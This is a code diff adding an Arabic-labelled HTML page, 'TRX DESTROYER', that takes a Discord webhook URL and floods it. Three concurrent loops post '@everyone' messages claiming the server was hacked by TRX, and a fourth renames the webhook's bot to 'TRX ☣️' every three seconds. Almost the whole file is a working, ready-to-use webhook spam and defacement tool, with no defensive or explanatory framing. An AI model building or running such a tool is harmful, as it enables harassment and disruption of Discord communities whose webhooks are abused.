@@ -1,1 +1,171 @@
--مغلق
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>MRX · TRX DESTROYER</title>
+    <style>
+        body {
+            font-family: Arial; background: #0a0a0a; color: #fff;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; margin: 0;
+        }
+        .box {
+            background: #111; border: 1px solid #333;
+            border-radius: 30px; padding: 40px;
+            width: 500px; max-width: 95%; text-align: center;
+        }
+        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; font-size: 38px; }
+        p { color: #555; font-size: 12px; margin: 0 0 20px; letter-spacing: 3px; }
+        input {
+            width: 100%; padding: 15px 20px; box-sizing: border-box;
+            background: #1a1a1a; border: 1px solid #333;
+            border-radius: 30px; color: #fff; font-size: 14px;
+            direction: ltr; text-align: left; outline: none;
+        }
+        input:focus { border-color: #ff1a1a; }
+        .brow {
+            display: flex; gap: 10px; margin: 20px 0;
+        }
+        .b1 {
+            flex: 1; padding: 16px; background: #cc0000; color: #fff;
+            border: none; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
+        }
+        .b1:hover { background: #ff1a1a; }
+        .b1:disabled { opacity: 0.3; cursor: not-allowed; }
+        .b2 {
+            flex: 1; padding: 16px; background: #222; color: #888;
+            border: 1px solid #444; border-radius: 30px; font-size: 16px;
+            font-weight: 700; cursor: pointer; letter-spacing: 3px;
+        }
+        .b2:hover { background: #cc0000; color: #fff; }
+        .b2:disabled { opacity: 0.3; cursor: not-allowed; }
+        #cnt { color: #00ff88; font-size: 22px; font-weight: 700; margin: 5px 0; }
+        #log {
+            width: 100%; height: 160px; margin-top: 12px; box-sizing: border-box;
+            background: #050505; color: #00ff88;
+            border: 1px solid #2a2a2a; border-radius: 16px;
+            padding: 15px; font-family: monospace; font-size: 12px;
+            direction: ltr; text-align: left; resize: none;
+        }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>☠️ TRX</h1>
+    <p>● @everyone + تغيير اسم البوت ●</p>
+    <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/...">
+    <div class="brow">
+        <button class="b1" id="go" onclick="START()">💀 ابدأ</button>
+        <button class="b2" id="stp" onclick="STOP()" disabled>⛔ إيقاف</button>
+    </div>
+    <div>الرسائل: <span id="cnt">0</span></div>
+    <textarea id="log" readonly placeholder="..."></textarea>
+</div>
+
+<script>
+let run = false, stopIt = false, n = 0, timers = [];
+
+function $(x) { return document.getElementById(x); }
+
+function LOG(t) {
+    const e = $('log');
+    e.value += `[${new Date().toLocaleTimeString()}] ${t}\n`;
+    e.scrollTop = e.scrollHeight;
+}
+
+async function SEND(wh, txt) {
+    if (stopIt) return;
+    try {
+        const fd = new FormData();
+        fd.append('payload_json', JSON.stringify({ content: txt }));
+        await fetch(wh, { method: 'POST', mode: 'no-cors', body: fd });
+        n++;
+        $('cnt').textContent = n;
+    } catch(e) {}
+}
+
+async function RENAME(wh) {
+    if (stopIt) return;
+    try {
+        await fetch(wh, {
+            method: 'PATCH', mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: 'TRX ☣️' })
+        });
+        LOG('✅ تم تغيير اسم البوت → TRX ☣️');
+    } catch(e) {}
+}
+
+// حلقة الإرسال — 10 رسائل كل دورة
+function SPAM_LOOP(wh, txt) {
+    if (stopIt) return;
+    for (let i = 0; i < 10; i++) SEND(wh, txt);
+    const t = setTimeout(() => SPAM_LOOP(wh, txt), 200);
+    timers.push(t);
+}
+
+// حلقة تغيير الاسم — كل 3 ثواني
+function NAME_LOOP(wh) {
+    if (stopIt) return;
+    RENAME(wh);
+    const t = setTimeout(() => NAME_LOOP(wh), 3000);
+    timers.push(t);
+}
+
+// حلقة ثانية إرسال — زيادة قوة
+function SPAM_LOOP2(wh, txt) {
+    if (stopIt) return;
+    for (let i = 0; i < 10; i++) SEND(wh, txt);
+    const t = setTimeout(() => SPAM_LOOP2(wh, txt), 400);
+    timers.push(t);
+}
+
+function START() {
+    const wh = $('wh').value.trim();
+    if (!wh) { alert('حط رابط Webhook'); return; }
+    if (run) return;
+    run = true; stopIt = false; n = 0;
+    timers = [];
+    $('cnt').textContent = '0';
+    $('go').disabled = true;
+    $('stp').disabled = false;
+    LOG('🚀 بدء التدمير — @everyone + TRX ☣️');
+    LOG('🚀 ما يوقف إلا إذا ضغطت إيقاف');
+
+    const txt = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @everyone';
+
+    // 3 حلقات إرسال + 1 حلقة تغيير اسم
+    SPAM_LOOP(wh, txt);
+    SPAM_LOOP2(wh, txt);
+    NAME_LOOP(wh);
+
+    // حلقة ثالثة خفيفة
+    const t3 = setTimeout(() => {
+        function L3() {
+            if (stopIt) return;
+            for (let i = 0; i < 10; i++) SEND(wh, txt);
+            const t = setTimeout(L3, 600);
+            timers.push(t);
+        }
+        L3();
+    }, 100);
+    timers.push(t3);
+}
+
+function STOP() {
+    if (!run) return;
+    LOG('⛔ إيقاف...');
+    stopIt = true;
+    for (const t of timers) clearTimeout(t);
+    timers = [];
+    setTimeout(() => {
+        run = false;
+        $('go').disabled = false;
+        $('stp').disabled = true;
+        LOG(`🛑 توقف. تم الإرسال: ${n}`);
+    }, 300);
+}
+</script>
+</body>
+</html>
